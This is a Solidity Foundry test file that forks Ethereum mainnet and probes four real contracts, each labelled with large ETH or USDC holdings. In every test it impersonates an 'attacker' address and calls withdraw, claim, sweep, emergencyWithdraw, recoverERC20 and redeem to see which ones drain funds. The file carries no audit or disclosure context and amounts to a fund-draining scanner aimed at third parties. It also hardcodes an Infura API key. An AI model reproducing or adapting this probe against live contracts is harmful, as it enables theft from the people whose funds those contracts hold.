// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title New High Value Exploit
 * @notice Test exploit vectors on newly found high-value contracts
 */
contract NewHighValueExploitTest is Test {

    address WETH;
    address USDC;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        WETH = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
    }

    function test_exploit98078db() public {
        // 0x98078db053902644191f93988341E31289E1C8FE - 2,767 ETH
        address target = vm.parseAddress("0x98078db053902644191f93988341E31289E1C8FE");
        address attacker = address(0xBEEF);

        console.log("=== TARGET: 0x98078db... (2,767 ETH) ===");
        console.log("ETH Balance:", target.balance / 1e18);

        // Check what contract this is
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            console.log("Name:", abi.decode(d, (string)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check proxy implementation
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try common exploit vectors
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("emergencyWithdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("sweep(address)", WETH));
        console.log("sweep(WETH):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("rescueETH()"));
        console.log("rescueETH():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        console.log("Attacker ETH after:", attacker.balance / 1e18);
    }

    function test_exploit4c21B75() public {
        // 0x4c21B7577C8FE8b0B0669165ee7C8f67fa1454Cf - 9.6M USDC
        address target = vm.parseAddress("0x4c21B7577C8FE8b0B0669165ee7C8f67fa1454Cf");
        address attacker = address(0xBEEF);

        console.log("=== TARGET: 0x4c21B75... (9.6M USDC) ===");

        // Check USDC balance
        (bool s, bytes memory d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("USDC Balance:", bal / 1e6);
        }

        // Check what contract this is
        (s, d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            console.log("Name:", abi.decode(d, (string)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check proxy implementation
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try common exploit vectors
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1000e6));
        console.log("withdraw(1000e6):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("sweep(address)", USDC));
        console.log("sweep(USDC):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("recoverERC20(address,uint256)", USDC, 1000e6));
        console.log("recoverERC20:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        // Check attacker USDC after
        (s, d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("Attacker USDC after:", bal / 1e6);
        }
    }

    function test_exploitd60247c() public {
        // 0xd60247c6848B7Ca29eDdF63AA924E53dB6Ddd8EC - 2,530 ETH
        address target = vm.parseAddress("0xd60247c6848B7Ca29eDdF63AA924E53dB6Ddd8EC");
        address attacker = address(0xBEEF);

        console.log("=== TARGET: 0xd60247c... (2,530 ETH) ===");
        console.log("ETH Balance:", target.balance / 1e18);

        // Check what contract this is
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            console.log("Name:", abi.decode(d, (string)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("admin()"));
        if (s && d.length >= 32) {
            address admin = abi.decode(d, (address));
            console.log("Admin:", admin);
        }

        // Check proxy implementation
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try common exploit vectors
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("emergencyWithdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("redeem(uint256)", 1 ether));
        console.log("redeem(1e18):", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        console.log("Attacker ETH after:", attacker.balance / 1e18);
    }

    function test_exploit6ef103E() public {
        // 0x6ef103E88E6d32c28b98f0d583A5B3092C9B65e1 - 16.6M USDC
        address target = vm.parseAddress("0x6ef103E88E6d32c28b98f0d583A5B3092C9B65e1");
        address attacker = address(0xBEEF);

        console.log("=== TARGET: 0x6ef103E... (16.6M USDC) ===");

        // Check USDC balance
        (bool s, bytes memory d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("USDC Balance:", bal / 1e6);
        }

        // Check what contract this is
        (s, d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            console.log("Name:", abi.decode(d, (string)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("symbol()"));
        if (s && d.length > 0) {
            console.log("Symbol:", abi.decode(d, (string)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check proxy implementation
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            address implAddr = address(uint160(uint256(impl)));
            console.log("Implementation:", implAddr);

            // Check if impl is uninitialized
            (s, d) = implAddr.staticcall(abi.encodeWithSignature("owner()"));
            if (s && d.length >= 32) {
                address implOwner = abi.decode(d, (address));
                console.log("Impl Owner:", implOwner);
            }
        }

        // Try common exploit vectors
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1000e6));
        console.log("withdraw(1000e6):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("redeem(uint256,address,address)", 1000e6, attacker, attacker));
        console.log("redeem:", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("sweep(address)", USDC));
        console.log("sweep(USDC):", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        // Check attacker USDC after
        (s, d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("Attacker USDC after:", bal / 1e6);
        }
    }
}
